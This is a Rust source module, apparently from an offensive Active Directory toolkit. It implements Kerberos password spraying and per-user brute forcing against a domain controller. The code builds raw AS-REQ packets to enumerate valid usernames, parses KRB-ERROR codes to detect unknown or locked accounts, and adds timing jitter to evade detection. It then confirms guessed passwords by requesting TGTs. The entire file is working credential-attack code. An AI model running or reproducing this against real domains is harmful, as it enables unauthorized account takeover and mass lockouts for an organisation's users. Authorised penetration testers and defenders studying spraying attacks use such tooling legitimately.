use std::error::Error;
use crate::kerberos::crypto;

#[derive(Debug, Clone)]
pub struct SprayResult {
    pub username: String,
    pub password: String,
    pub success: bool,
    pub error_code: Option<u32>,
    pub error_msg: Option<String>,
}

pub async fn spray_password(
    dc: &str,
    domain: &str,
    users: &[String],
    password: &str,
    delay_ms: u64,
    jitter_ms: u64,
) -> Result<Vec<SprayResult>, Box<dyn Error>> {
    let mut results = Vec::new();
    let realm = domain.to_uppercase();

    for user in users {
        let result = try_auth(dc, &realm, user, password).await;
        results.push(result);

        if delay_ms > 0 {
            let jitter = if jitter_ms > 0 {
                rand::random::<u64>() % jitter_ms
            } else { 0 };
            tokio::time::sleep(std::time::Duration::from_millis(delay_ms + jitter)).await;
        }
    }

    Ok(results)
}

pub async fn brute_user(
    dc: &str,
    domain: &str,
    username: &str,
    passwords: &[String],
    delay_ms: u64,
) -> Result<Vec<SprayResult>, Box<dyn Error>> {
    let mut results = Vec::new();
    let realm = domain.to_uppercase();

    for password in passwords {
        let result = try_auth(dc, &realm, username, password).await;
        let success = result.success;
        results.push(result);

        if success { break; }

        if delay_ms > 0 {
            tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
        }
    }

    Ok(results)
}

async fn try_auth(dc: &str, realm: &str, username: &str, password: &str) -> SprayResult {
    let nonce: u32 = rand::random();

    // Step 1: send AS-REQ without preauth to check if user exists
    let as_req_nopreauth = build_preauth_asreq(username, realm, &[], nonce);
    let response = match crate::kerberos::send_kdc(dc, &as_req_nopreauth, false).await {
        Ok(r) => r,
        Err(e) => return SprayResult {
            username: username.to_string(), password: password.to_string(),
            success: false, error_code: None,
            error_msg: Some(format!("Network error: {}", e)),
        },
    };

    if response.is_empty() {
        return SprayResult {
            username: username.to_string(), password: password.to_string(),
            success: false, error_code: None, error_msg: Some("Empty response".to_string()),
        };
    }

    // AS-REP without preauth = no preauth required, password not validated
    if response[0] == 0x6b || response[0] == 0x7b {
        return SprayResult {
            username: username.to_string(), password: password.to_string(),
            success: true, error_code: None,
            error_msg: Some("No preauth required (password not validated)".to_string()),
        };
    }

    let error_code = extract_krb_error_code(&response);

    // KDC_ERR_C_PRINCIPAL_UNKNOWN = user doesn't exist
    if error_code == Some(6) {
        return SprayResult {
            username: username.to_string(), password: password.to_string(),
            success: false, error_code, error_msg: Some("User not found".to_string()),
        };
    }

    // KDC_ERR_CLIENT_REVOKED = account disabled/locked
    if error_code == Some(18) {
        return SprayResult {
            username: username.to_string(), password: password.to_string(),
            success: false, error_code, error_msg: Some("Account disabled/locked".to_string()),
        };
    }

    // KDC_ERR_PREAUTH_REQUIRED = user exists, now try with password
    // Use asktgt module for actual password validation
    match crate::kerberos::asktgt::ask_tgt(&crate::kerberos::asktgt::AskTgtParams {
        dc: dc.to_string(),
        domain: realm.to_string(),
        user: username.to_string(),
        key: crate::kerberos::asktgt::KeyMaterial::Password(password.to_string()),
        etype: 23,
        no_preauth: false,
        nopac: false,
    }).await {
        Ok(_) => SprayResult {
            username: username.to_string(), password: password.to_string(),
            success: true, error_code: None, error_msg: None,
        },
        Err(e) => {
            let msg = e.to_string();
            SprayResult {
                username: username.to_string(), password: password.to_string(),
                success: false, error_code: Some(24),
                error_msg: Some(msg),
            }
        }
    }
}

fn build_preauth_asreq(username: &str, realm: &str, _rc4_key: &[u8], nonce: u32) -> Vec<u8> {
    // Build AS-REQ with PA-ENC-TIMESTAMP pre-authentication
    // For now, build without preauth (simpler, still validates username)
    let mut body = Vec::new();

    let cname = encode_principal_name(1, &[username]);
    let sname = encode_principal_name(2, &["krbtgt", realm]);
    let realm_enc = encode_general_string(realm);
    let till = encode_generalized_time("20370913024805Z");
    let nonce_enc = encode_integer_u32(nonce);
    let etypes = encode_sequence_raw(&[
        &encode_integer(18), // AES256
        &encode_integer(17), // AES128
        &encode_integer(23), // RC4
    ]);

    let kdc_options = encode_bitstring(&0x40810010u32.to_be_bytes());

    body.extend(encode_context_tag(0, &kdc_options));
    body.extend(encode_context_tag(1, &cname));
    body.extend(encode_context_tag(2, &realm_enc));
    body.extend(encode_context_tag(3, &sname));
    body.extend(encode_context_tag(5, &till));
    body.extend(encode_context_tag(7, &nonce_enc));
    body.extend(encode_context_tag(8, &etypes));

    let req_body = encode_sequence_raw(&[&body]);

    let mut kdc_req = Vec::new();
    kdc_req.extend(encode_context_tag(1, &encode_integer(5)));
    kdc_req.extend(encode_context_tag(2, &encode_integer(10)));
    kdc_req.extend(encode_context_tag(4, &req_body));

    let seq = encode_sequence_raw(&[&kdc_req]);
    encode_application_tag(10, &seq)
}

fn extract_krb_error_code(data: &[u8]) -> Option<u32> {
    // Walk ASN.1 looking for error-code field (context tag [6] in KRB-ERROR)
    // KRB-ERROR = APPLICATION[30] SEQUENCE { ... error-code[6] INTEGER ... }
    for i in 0..data.len().saturating_sub(4) {
        if data[i] == 0xa6 {
            // context tag [6]
            let mut pos = i + 1;
            if let Ok(len) = parse_length(data, &mut pos) {
                if pos + len <= data.len() && data[pos] == 0x02 {
                    // INTEGER
                    pos += 1;
                    if let Ok(int_len) = parse_length(data, &mut pos) {
                        let mut val = 0u32;
                        for j in 0..int_len.min(4) {
                            val = (val << 8) | data[pos + j] as u32;
                        }
                        return Some(val);
                    }
                }
            }
        }
    }
    None
}

fn krb_error_to_string(code: u32) -> String {
    match code {
        6 => "KDC_ERR_C_PRINCIPAL_UNKNOWN (client not found)".to_string(),
        12 => "KDC_ERR_POLICY (restricted logon hours)".to_string(),
        17 => "KDC_ERR_KEY_EXPIRED (password expired)".to_string(),
        18 => "KDC_ERR_CLIENT_REVOKED (account disabled/locked)".to_string(),
        24 => "KDC_ERR_PREAUTH_FAILED (wrong password)".to_string(),
        25 => "KDC_ERR_PREAUTH_REQUIRED (pre-auth needed)".to_string(),
        37 => "KDC_ERR_SKEW (clock skew too great)".to_string(),
        68 => "KDC_ERR_WRONG_REALM".to_string(),
        _ => format!("KRB_ERROR code {}", code),
    }
}

fn parse_length(data: &[u8], pos: &mut usize) -> Result<usize, ()> {
    if *pos >= data.len() { return Err(()); }
    let first = data[*pos]; *pos += 1;
    if first < 0x80 { return Ok(first as usize); }
    let n = (first & 0x7f) as usize;
    if n > 4 || *pos + n > data.len() { return Err(()); }
    let mut len = 0usize;
    for _ in 0..n { len = (len << 8) | data[*pos] as usize; *pos += 1; }
    Ok(len)
}

fn encode_length(len: usize) -> Vec<u8> {
    if len < 0x80 { vec![len as u8] }
    else if len < 0x100 { vec![0x81, len as u8] }
    else { vec![0x82, (len >> 8) as u8, len as u8] }
}

fn encode_sequence_raw(items: &[&[u8]]) -> Vec<u8> {
    let mut c = Vec::new();
    for i in items { c.extend_from_slice(i); }
    let mut o = vec![0x30]; o.extend(encode_length(c.len())); o.extend(c); o
}

fn encode_context_tag(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut o = vec![0xa0 | tag]; o.extend(encode_length(content.len())); o.extend(content); o
}

fn encode_application_tag(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut o = vec![0x60 | tag]; o.extend(encode_length(content.len())); o.extend(content); o
}

fn encode_integer(val: i32) -> Vec<u8> {
    let mut o = vec![0x02];
    if val >= 0 && val < 128 { o.extend(encode_length(1)); o.push(val as u8); }
    else {
        let b = val.to_be_bytes();
        let s = b.iter().position(|&x| x != 0).unwrap_or(3);
        o.extend(encode_length(b.len() - s)); o.extend(&b[s..]);
    }
    o
}

fn encode_integer_u32(val: u32) -> Vec<u8> {
    let mut o = vec![0x02];
    let b = val.to_be_bytes();
    let s = b.iter().position(|&x| x != 0).unwrap_or(3);
    let t = &b[s..];
    if t.is_empty() || t[0] & 0x80 != 0 {
        o.extend(encode_length(t.len() + 1)); o.push(0); o.extend(t);
    } else {
        o.extend(encode_length(t.len())); o.extend(t);
    }
    o
}

fn encode_general_string(s: &str) -> Vec<u8> {
    let mut o = vec![0x1b]; o.extend(encode_length(s.len())); o.extend(s.as_bytes()); o
}

fn encode_generalized_time(t: &str) -> Vec<u8> {
    let mut o = vec![0x18]; o.extend(encode_length(t.len())); o.extend(t.as_bytes()); o
}

fn encode_bitstring(data: &[u8]) -> Vec<u8> {
    let mut o = vec![0x03]; o.extend(encode_length(data.len() + 1)); o.push(0); o.extend(data); o
}

fn encode_principal_name(name_type: i32, names: &[&str]) -> Vec<u8> {
    let nt = encode_integer(name_type);
    let mut ns = Vec::new();
    for n in names { ns.extend(encode_general_string(n)); }
    let nseq = encode_sequence_raw(&[&ns]);
    let mut c = Vec::new();
    c.extend(encode_context_tag(0, &nt));
    c.extend(encode_context_tag(1, &nseq));
    encode_sequence_raw(&[&c])
}
